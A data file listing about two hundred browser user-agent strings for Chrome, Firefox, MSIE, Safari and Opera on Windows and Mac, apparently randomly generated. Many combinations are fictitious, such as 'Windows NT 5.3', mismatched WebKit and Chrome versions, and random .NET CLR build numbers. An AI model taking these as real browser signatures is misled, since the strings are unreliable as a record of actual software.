Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/28.0.887.0 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/34.0.824.0 Safari/538.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/39.0.845.0 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/38.0.881.0 Safari/535.1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; .NET CLR 2.3.74966.1)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2)  AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/28.0.807.0 Safari/532.2.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/4.0; .NET CLR 3.5.82949.9)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7 rv:6.0; SC) AppleWebKit/532.2.2 (KHTML, like Gecko) Version/6.0.7 Safari/532.2.2
Mozilla/5.0 (Windows NT 5.2; rv:5.0) Gecko/20100101 Firefox/5.0.3
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/24.0.864.0 Safari/534.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/22.0.830.0 Safari/536.0.2
Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:7.3) Gecko/20100101 Firefox/7.3.4
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/7.0; .NET CLR 4.5.41340.1)
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:14.9) Gecko/20100101 Firefox/14.9.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.1; .NET CLR 3.8.48075.2)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.1; .NET CLR 2.0.19300.2)
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:8.2) Gecko/20100101 Firefox/8.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/37.0.871.0 Safari/537.0.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:9.0) Gecko/20100101 Firefox/9.0.7
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/36.0.825.0 Safari/536.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.1 (KHTML, like Gecko) Chrome/18.0.842.0 Safari/531.1.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 3.2.43340.6)
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/7.1; .NET CLR 3.6.81047.4)
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.1) Gecko/20100101 Firefox/5.1.6
Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:15.2) Gecko/20100101 Firefox/15.2.7
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/22.0.844.0 Safari/536.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/23.0.840.0 Safari/537.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/29.0.843.0 Safari/531.2.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9 rv:2.0; BR) AppleWebKit/537.1.1 (KHTML, like Gecko) Version/7.1.0 Safari/537.1.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6)  AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/24.0.819.0 Safari/538.1.0
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.2) Gecko/20100101 Firefox/5.2.9
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.1; .NET CLR 4.0.43493.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:6.0; FY) AppleWebKit/538.1.0 (KHTML, like Gecko) Version/4.0.3 Safari/538.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/18.0.872.0 Safari/532.1.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/3.1; .NET CLR 2.1.67727.1)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1)  AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/22.0.858.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/34.0.840.0 Safari/532.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/19.0.846.0 Safari/533.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/38.0.844.0 Safari/531.0.1
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:7.8) Gecko/20100101 Firefox/7.8.6
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.1; .NET CLR 2.7.18139.1)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/25.0.824.0 Safari/533.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/32.0.891.0 Safari/533.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/23.0.858.0 Safari/532.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2 rv:4.0; BE) AppleWebKit/535.1.0 (KHTML, like Gecko) Version/7.1.2 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/33.0.855.0 Safari/533.2.1
Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.3
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/31.0.836.0 Safari/532.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/35.0.844.0 Safari/536.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/22.0.824.0 Safari/532.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2 rv:6.0; UR) AppleWebKit/536.1.2 (KHTML, like Gecko) Version/7.1.6 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/18.0.818.0 Safari/532.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_7 rv:6.0; SL) AppleWebKit/533.1.0 (KHTML, like Gecko) Version/6.0.10 Safari/533.1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.3; Trident/4.1; .NET CLR 4.6.72156.2)
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:12.5) Gecko/20100101 Firefox/12.5.3
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Trident/6.0; .NET CLR 3.1.50057.1)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/20.0.808.0 Safari/531.1.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Trident/6.1; .NET CLR 2.0.96591.8)
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/37.0.824.0 Safari/533.2.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0)  AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/26.0.878.0 Safari/533.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/33.0.893.0 Safari/534.2.1
Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_5 rv:4.0; NB) AppleWebKit/534.1.0 (KHTML, like Gecko) Version/4.1.3 Safari/534.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/19.0.891.0 Safari/531.2.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0; .NET CLR 3.6.56682.7)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/23.0.882.0 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/37.0.804.0 Safari/533.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2 rv:3.0; PT) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/5.0.2 Safari/531.1.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9)  AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/15.0.811.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/16.0.838.0 Safari/538.1.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:8.5) Gecko/20100101 Firefox/8.5.7
Opera/9.13 (Windows NT 5.2; U; UK Presto/2.9.176 Version/11.00)
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:12.2) Gecko/20100101 Firefox/12.2.9
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.3; Trident/7.0; .NET CLR 4.8.79847.0)
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/25.0.825.0 Safari/538.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_1 rv:2.0; ZH) AppleWebKit/531.0.2 (KHTML, like Gecko) Version/5.0.3 Safari/531.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_9 rv:5.0; NB) AppleWebKit/537.2.2 (KHTML, like Gecko) Version/4.0.10 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.1.1 (KHTML, like Gecko) Chrome/16.0.844.0 Safari/531.1.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.1) Gecko/20100101 Firefox/8.1.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 3.0.26051.3)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.1; rv:12.4) Gecko/20100101 Firefox/12.4.5
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/7.1; .NET CLR 1.6.44787.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8 rv:6.0; CO) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/7.0.2 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/28.0.855.0 Safari/535.1.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.8; rv:7.6) Gecko/20100101 Firefox/7.6.2
Opera/12.46 (Windows NT 5.2; U; IS Presto/2.9.173 Version/11.00)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.8.43842.2)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/7.1; .NET CLR 3.2.42589.7)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/34.0.897.0 Safari/531.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/34.0.877.0 Safari/535.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/14.0.880.0 Safari/536.1.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7.8; rv:6.3) Gecko/20100101 Firefox/6.3.7
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/34.0.804.0 Safari/538.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/33.0.837.0 Safari/531.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.6; rv:11.3) Gecko/20100101 Firefox/11.3.1
Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0.4
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/25.0.872.0 Safari/531.0.1
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:15.7) Gecko/20100101 Firefox/15.7.7
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Trident/4.0; .NET CLR 3.2.62262.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3 rv:2.0; LA) AppleWebKit/538.1.0 (KHTML, like Gecko) Version/5.0.8 Safari/538.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/25.0.845.0 Safari/534.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/18.0.804.0 Safari/537.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/34.0.884.0 Safari/531.2.1
Mozilla/5.0 (Windows NT 6.2; rv:12.1) Gecko/20100101 Firefox/12.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6.3; rv:15.3) Gecko/20100101 Firefox/15.3.9
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/28.0.870.0 Safari/534.0.0
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:10.9) Gecko/20100101 Firefox/10.9.4
Mozilla/5.0 (Windows NT 6.0; rv:13.3) Gecko/20100101 Firefox/13.3.5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1)  AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/32.0.865.0 Safari/535.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/37.0.864.0 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/29.0.891.0 Safari/537.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/14.0.891.0 Safari/532.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/34.0.848.0 Safari/535.2.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0; .NET CLR 4.2.22598.3)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7 rv:3.0; HU) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/5.1.6 Safari/534.0.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/7.0; .NET CLR 1.1.72942.0)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_8)  AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/33.0.827.0 Safari/536.0.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/3.1; .NET CLR 3.1.44499.7)
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/22.0.829.0 Safari/531.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/28.0.844.0 Safari/531.0.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; .NET CLR 4.9.64644.7)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/14.0.830.0 Safari/532.1.1
Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:11.4) Gecko/20100101 Firefox/11.4.8
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/29.0.849.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/19.0.872.0 Safari/531.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/33.0.823.0 Safari/534.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/13.0.853.0 Safari/534.1.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.1) Gecko/20100101 Firefox/14.1.5
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7 rv:2.0; SO) AppleWebKit/536.2.1 (KHTML, like Gecko) Version/7.0.8 Safari/536.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5 rv:6.0; DA) AppleWebKit/536.1.2 (KHTML, like Gecko) Version/5.0.6 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/19.0.814.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/35.0.880.0 Safari/535.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2 rv:2.0; CO) AppleWebKit/532.1.0 (KHTML, like Gecko) Version/7.0.6 Safari/532.1.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:5.5) Gecko/20100101 Firefox/5.5.7
Mozilla/5.0 (Windows NT 6.2; rv:11.9) Gecko/20100101 Firefox/11.9.0
Mozilla/5.0 (Windows NT 6.0; rv:12.5) Gecko/20100101 Firefox/12.5.9
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/14.0.802.0 Safari/534.0.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/7.1; .NET CLR 3.4.11374.5)
Mozilla/5.0 (Windows NT 6.2; rv:8.6) Gecko/20100101 Firefox/8.6.9
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5.3; rv:12.1) Gecko/20100101 Firefox/12.1.9
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/39.0.867.0 Safari/532.2.2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.8.3; rv:15.8) Gecko/20100101 Firefox/15.8.4
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.7; rv:14.3) Gecko/20100101 Firefox/14.3.6
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_1)  AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/33.0.819.0 Safari/535.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/21.0.862.0 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/26.0.877.0 Safari/536.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/28.0.844.0 Safari/535.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)  AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/30.0.856.0 Safari/536.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/15.0.893.0 Safari/535.0.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/6.1; .NET CLR 4.9.43703.7)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/29.0.877.0 Safari/533.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/17.0.861.0 Safari/537.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/19.0.804.0 Safari/535.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/39.0.809.0 Safari/537.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_0)  AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/17.0.820.0 Safari/535.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/32.0.898.0 Safari/537.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/34.0.876.0 Safari/536.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/39.0.817.0 Safari/532.0.0
Opera/10.4 (Windows NT 6.0; U; FY Presto/2.9.162 Version/10.00)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/31.0.888.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/16.0.883.0 Safari/533.1.2
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:7.9) Gecko/20100101 Firefox/7.9.4
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/14.0.825.0 Safari/532.1.2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.2) Gecko/20100101 Firefox/15.2.5
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/24.0.880.0 Safari/534.2.2
Mozilla/5.0 (Windows NT 6.1; rv:8.3) Gecko/20100101 Firefox/8.3.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/26.0.849.0 Safari/532.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/28.0.864.0 Safari/535.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/21.0.871.0 Safari/538.0.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/6.0; .NET CLR 1.6.39975.6)
Mozilla/5.0 (Windows NT 5.1; rv:13.7) Gecko/20100101 Firefox/13.7.3
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/17.0.844.0 Safari/534.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/13.0.847.0 Safari/534.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/38.0.825.0 Safari/537.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2 rv:2.0; CS) AppleWebKit/536.2.2 (KHTML, like Gecko) Version/5.0.9 Safari/536.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.1.2 (KHTML, like Gecko) Chrome/26.0.876.0 Safari/534.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/38.0.893.0 Safari/532.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/16.0.846.0 Safari/536.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7 rv:4.0; VO) AppleWebKit/534.1.0 (KHTML, like Gecko) Version/5.1.3 Safari/534.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/28.0.811.0 Safari/536.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5)  AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/26.0.852.0 Safari/531.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/36.0.828.0 Safari/532.1.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_9)  AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/24.0.874.0 Safari/531.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/37.0.865.0 Safari/531.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/31.0.863.0 Safari/534.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/32.0.870.0 Safari/531.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/34.0.892.0 Safari/534.1.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.1) Gecko/20100101 Firefox/6.1.8
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/30.0.825.0 Safari/535.2.1
Mozilla/5.0 (Windows NT 6.0; rv:7.6) Gecko/20100101 Firefox/7.6.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/27.0.808.0 Safari/532.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/31.0.892.0 Safari/532.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/38.0.806.0 Safari/535.0.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4 rv:4.0; BG) AppleWebKit/535.2.0 (KHTML, like Gecko) Version/6.0.0 Safari/535.2.0
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/6.0; .NET CLR 1.7.78864.0)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/30.0.873.0 Safari/536.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2)  AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/33.0.825.0 Safari/533.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/29.0.842.0 Safari/537.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/15.0.829.0 Safari/532.1.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/7.0; .NET CLR 4.4.59537.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5 rv:2.0; SL) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/6.0.9 Safari/531.2.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2)  AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/21.0.821.0 Safari/536.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/20.0.875.0 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/25.0.837.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/32.0.810.0 Safari/535.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/18.0.831.0 Safari/531.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/17.0.870.0 Safari/536.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/34.0.874.0 Safari/531.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/15.0.881.0 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/16.0.826.0 Safari/533.0.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_8 rv:5.0; ES) AppleWebKit/532.0.1 (KHTML, like Gecko) Version/4.0.1 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/23.0.877.0 Safari/534.2.2
